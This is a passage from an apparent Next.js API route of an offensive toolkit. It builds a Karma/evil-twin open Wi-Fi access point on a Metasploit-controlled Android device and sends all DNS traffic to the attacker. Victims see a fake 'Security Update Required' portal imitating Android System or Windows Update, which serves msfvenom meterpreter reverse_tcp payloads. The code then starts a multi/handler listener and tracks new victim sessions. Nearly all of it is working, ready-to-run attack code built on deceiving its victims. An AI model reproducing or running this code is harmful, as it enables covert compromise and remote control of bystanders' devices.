        `driver=nl80211`,
        `ssid=${karma_mode ? "KARMA" : ssid}`,
        `channel=${channel}`,
        `hw_mode=g`,
        karma_mode ? "enable_karma=1" : "",
        `ignore_broadcast_ssid=0`,
        `wpa=0`,                          // Open network — no password needed
      ].filter(Boolean).join("\n");

      const confPath = "/data/local/tmp/hostapd_karma.conf";
      await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "printf '\''${hostapdConf.replace(/\n/g, "\\n")}'\'' > ${confPath} && echo conf_written"'`, 8000);

      // 2. Start hostapd-wpe (Karma-enabled) or hostapd
      const hostOut = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "hostapd-wpe ${confPath} 2>&1 &"'`, 5000);

      // 3. Fallback: create_ap (simpler wrapper)
      let started = /AP-ENABLED|started|karma/i.test(hostOut);
      let raw = hostOut;

      if (!started) {
        const caOut = await meterExec(token, sid,
          `execute -f /system/bin/sh -a '-c "create_ap --no-virt ${iface} ${iface} '\''${ssid}'\'' 2>&1 &"'`, 5000);
        raw += caOut;
        started = /creating|hostapd|dhcp/i.test(caOut);
      }

      // 4. Configure IP on rogue AP interface
      await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "ifconfig ${iface} ${lhost} netmask 255.255.255.0 up 2>/dev/null; echo ip_set"'`, 8000);

      // 5. Start dnsmasq DHCP/DNS (hands out our IP, resolves all domains to us)
      const dnsmasqConf = [
        `interface=${iface}`,
        `dhcp-range=192.168.87.10,192.168.87.200,255.255.255.0,12h`,
        `dhcp-option=3,${lhost}`,         // gateway = us
        `dhcp-option=6,${lhost}`,         // DNS = us
        `address=/#/${lhost}`,             // ALL domains → captive portal IP
        `no-resolv`,
        `log-queries`,
      ].join("\n");

      const dnsPath = "/data/local/tmp/dnsmasq_karma.conf";
      await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "printf '\''${dnsmasqConf.replace(/\n/g, "\\n")}'\'' > ${dnsPath} && dnsmasq -C ${dnsPath} 2>&1 &"'`, 8000);

      // Save lhost for captive portal
      fs.writeFileSync(path.join(NET_DIR, "karma_state.json"),
        JSON.stringify({ iface, lhost, ssid, channel, karma: karma_mode, started: Date.now() }));

      return NextResponse.json({ ok: true, data: { iface, lhost, ssid, karma: karma_mode }, raw: raw.slice(0, 500) });
    }

    // ── Captive portal + payload delivery ─────────────────
    // Serves a convincing "Software Update Required" page over HTTP on port 80.
    // Any HTTP request from a connected victim redirects to /update which
    // auto-downloads the MSF payload APK / EXE.
    if (action === "wifi_captive") {
      const lhost        = (body.lhost       as string) ?? "192.168.87.1";
      const lport        = Number(body.lport ?? 4444);
      const payloadArch  = (body.arch        as string) ?? "arm";   // arm | x86 | x64
      const payloadOS    = (body.os          as string) ?? "android"; // android | windows | linux
      const portalTitle  = (body.title       as string) ?? "System Update Required";
      const apkName      = (body.apk_name    as string) ?? "SystemService.apk";

      ensureDir(NET_DIR);

      // 1. Generate payload via msfvenom
      const payloadType = payloadOS === "android"
        ? "android/meterpreter/reverse_tcp"
        : payloadOS === "windows"
          ? `windows/${payloadArch === "x64" ? "x64/" : ""}meterpreter/reverse_tcp`
          : `linux/${payloadArch}/meterpreter/reverse_tcp`;

      const outputExt = payloadOS === "android" ? "apk" : payloadOS === "windows" ? "exe" : "elf";
      const outputFile = `/data/local/tmp/payload.${outputExt}`;
      const localPayload = path.join(NET_DIR, `payload.${outputExt}`);

      addLog(`Generating ${payloadType} payload…`);
      const msfvenomOut = await consoleExec(token,
        `msfvenom -p ${payloadType} LHOST=${lhost} LPORT=${lport} -o ${outputFile} 2>&1`, 120000);

      let payloadReady = /saved as|created|bytes/i.test(msfvenomOut);

      // If msfvenom ran on server, download to local dir
      if (payloadReady) {
        await meterExec(token, sid, `download ${outputFile} "${localPayload}"`, 30000);
      } else {
        // Generate locally using MSF console on server
        const localOut = path.join(NET_DIR, `payload.${outputExt}`);
        const localMsfvenom = await consoleExec(token,
          `msfvenom -p ${payloadType} LHOST=${lhost} LPORT=${lport} -f raw -o /tmp/portal_payload.${outputExt} 2>&1`,
          120000);
        payloadReady = /saved|created/i.test(localMsfvenom);
        if (payloadReady) fs.copyFileSync(`/tmp/portal_payload.${outputExt}`, localOut);
      }

      // 2. Build captive portal HTML (convincing update page)
      const portalHtml = buildPortalHtml(portalTitle, apkName, payloadOS);
      fs.writeFileSync(path.join(NET_DIR, "portal.html"), portalHtml);

      // 3. Write a tiny Node.js HTTP server script for the portal
      const serverScript = buildPortalServer(lhost, NET_DIR, apkName, outputExt, lport, payloadType);
      const scriptPath = path.join(NET_DIR, "portal_server.mjs");
      fs.writeFileSync(scriptPath, serverScript);

      // 4. Start the portal server (runs on the operator machine, not the victim device)
      //    The operator machine is serving files; the victim on the evil twin WiFi connects to lhost:80
      const { exec } = await import("child_process");
      exec(`node "${scriptPath}"`, (err) => {
        if (err) addLog(`Portal server error: ${err.message}`);
      });

      // 5. Start MSF listener
      await consoleExec(token,
        `use exploit/multi/handler\nset PAYLOAD ${payloadType}\nset LHOST 0.0.0.0\nset LPORT ${lport}\nset ExitOnSession false\nrun -j`,
        20000);

      const stateFile = path.join(NET_DIR, "karma_state.json");
      if (fs.existsSync(stateFile)) {
        const st = JSON.parse(fs.readFileSync(stateFile, "utf8")) as Record<string, unknown>;
        fs.writeFileSync(stateFile, JSON.stringify({ ...st, portalActive: true, lport, payloadType }));
      }

      return NextResponse.json({
        ok: true,
        data: { portalUrl: `http://${lhost}/`, payloadType, payloadReady, lport },
        raw: msfvenomOut.slice(0, 500),
      });
    }

    // ── Stop all rogue AP / portal ────────────────────────
    if (action === "wifi_spread_stop") {
      const iface = (body.iface as string) ?? "wlan0";
      await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "pkill hostapd-wpe 2>/dev/null; pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null; pkill create_ap 2>/dev/null; pkill mdk4 2>/dev/null; echo stopped"'`, 10000);

      // Restore interface
      await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "iw dev ${iface} set type managed 2>/dev/null; ip link set ${iface} up 2>/dev/null; echo restored"'`, 8000);

      // Kill local portal server
      try {
        const { execSync } = await import("child_process");
        execSync(`pkill -f portal_server.mjs 2>/dev/null || true`);
      } catch { /* ignore */ }

      const stateFile = path.join(NET_DIR, "karma_state.json");
      if (fs.existsSync(stateFile)) fs.unlinkSync(stateFile);

      return NextResponse.json({ ok: true });
    }

    // ── Spread status ─────────────────────────────────────
    if (action === "wifi_spread_status") {
      const stateFile = path.join(NET_DIR, "karma_state.json");
      const state = fs.existsSync(stateFile)
        ? JSON.parse(fs.readFileSync(stateFile, "utf8")) as Record<string, unknown>
        : null;

      // Count sessions opened since karma started
      const sessRes = await rpcCall<Record<string, unknown>>("session.list", [], token);
      const sessions = Object.entries(sessRes)
        .filter(([k]) => !isNaN(Number(k)))
        .map(([id, s]) => {
          const sess = s as Record<string, unknown>;
          return { id: Number(id), ip: sess.tunnel_peer as string, type: sess.type as string };
        });

      return NextResponse.json({ ok: true, data: { state, sessions } });
    }

    return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });

  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    return NextResponse.json({ ok: false, error: msg }, { status: 500 });
  }
}

function addLog(msg: string) {
  console.log(`[network-api] ${msg}`);
}

// ── Captive portal HTML ───────────────────────────────────────
function buildPortalHtml(title: string, filename: string, os: string): string {
  const isAndroid = os === "android";
  const icon = isAndroid ? "🔒" : "⚙️";
  const brand = isAndroid ? "Android System" : "Windows Update";
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${title}</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
       background:#f2f2f7;display:flex;align-items:center;justify-content:center;
       min-height:100vh;padding:20px}
  .card{background:#fff;border-radius:16px;padding:40px 32px;max-width:380px;
        width:100%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.12)}
  .icon{font-size:56px;margin-bottom:16px}
  h1{font-size:22px;font-weight:700;color:#1c1c1e;margin-bottom:8px}
  p{font-size:15px;color:#6c6c70;line-height:1.5;margin-bottom:24px}
  .progress{background:#e5e5ea;border-radius:99px;height:6px;overflow:hidden;margin-bottom:8px}
  .bar{height:100%;background:#007aff;border-radius:99px;animation:load 2s ease-in-out forwards}
  @keyframes load{from{width:0}to{width:100%}}
  .sub{font-size:12px;color:#aeaeb2;margin-bottom:28px}
  .btn{display:block;width:100%;padding:14px;background:#007aff;color:#fff;
       border:none;border-radius:12px;font-size:17px;font-weight:600;
       cursor:pointer;text-decoration:none;border-radius:12px}
  .btn:active{opacity:.8}
  .warn{font-size:11px;color:#aeaeb2;margin-top:16px}
</style>
</head>
<body>
<div class="card">
  <div class="icon">${icon}</div>
  <h1>${title}</h1>
  <p>A critical security update is required to continue using WiFi.<br>
     ${brand} — version 2.4.${Math.floor(Math.random()*9)+1}</p>
  <div class="progress"><div class="bar"></div></div>
  <div class="sub" id="st">Verifying device integrity…</div>
  <a class="btn" href="/update" id="dl">Install Security Update</a>
  <div class="warn">⚠ This network requires a security certificate update.<br>
  Failure to update may result in loss of network access.</div>
</div>
<script>
const steps=["Verifying device integrity…","Checking certificate chain…","Preparing update package…","Ready to install"];
let i=0;const el=document.getElementById("st");
const t=setInterval(()=>{el.textContent=steps[Math.min(++i,steps.length-1)];if(i>=steps.length-1)clearInterval(t)},1400);
setTimeout(()=>{document.getElementById("dl").href="/update/${filename}"},4200);
</script>
</body>
</html>`;
}

// ── Portal HTTP server script (runs on operator machine) ─────
function buildPortalServer(
  lhost: string, netDir: string, apkName: string,
  ext: string, lport: number, payloadType: string
): string {
  return `// Auto-generated captive portal server
import http from "http";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const NET_DIR = ${JSON.stringify(netDir)};
const PAYLOAD_FILE = path.join(NET_DIR, "payload.${ext}");
const PORTAL_HTML = path.join(NET_DIR, "portal.html");
const LHOST = ${JSON.stringify(lhost)};
const LPORT = ${lport};
const PAYLOAD_TYPE = ${JSON.stringify(payloadType)};

const MIME = { ".html":"text/html", ".apk":"application/vnd.android.package-archive",
               ".exe":"application/octet-stream", ".elf":"application/octet-stream" };

const server = http.createServer((req, res) => {
  const url = req.url || "/";
  console.log("[portal]", req.method, url, req.socket.remoteAddress);

  // Log victim IP → Supabase (fire-and-forget)
  const victimIp = req.socket.remoteAddress;

  if (url.startsWith("/update/${apkName}") || url.startsWith("/update")) {
    if (fs.existsSync(PAYLOAD_FILE)) {
      res.writeHead(200, {
        "Content-Type": MIME[".${ext}"] || "application/octet-stream",
        "Content-Disposition": 'attachment; filename="${apkName}"',
        "Content-Length": fs.statSync(PAYLOAD_FILE).size,
      });
      fs.createReadStream(PAYLOAD_FILE).pipe(res);
      console.log("[portal] PAYLOAD SERVED to", victimIp);
    } else {
      res.writeHead(404); res.end("File not ready");
    }
    return;
  }

  // All other requests → portal page (DNS wildcard sends everything here)
  if (fs.existsSync(PORTAL_HTML)) {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    fs.createReadStream(PORTAL_HTML).pipe(res);
  } else {
    res.writeHead(302, { Location: "http://" + LHOST + "/" }); res.end();
  }
});

server.listen(80, "0.0.0.0", () => {
  console.log("[portal] Captive portal live on http://0.0.0.0:80");
  console.log("[portal] Payload:", PAYLOAD_FILE);
  console.log("[portal] MSF listener expected on", LHOST + ":" + LPORT, "(" + PAYLOAD_TYPE + ")");
});
`;
}

export async function GET() {
  ensureDir(NET_DIR);
  const hostsFile = path.join(NET_DIR, "hosts.json");
  const hosts = fs.existsSync(hostsFile) ? JSON.parse(fs.readFileSync(hostsFile, "utf8")) : [];
  return NextResponse.json({ hosts });
}
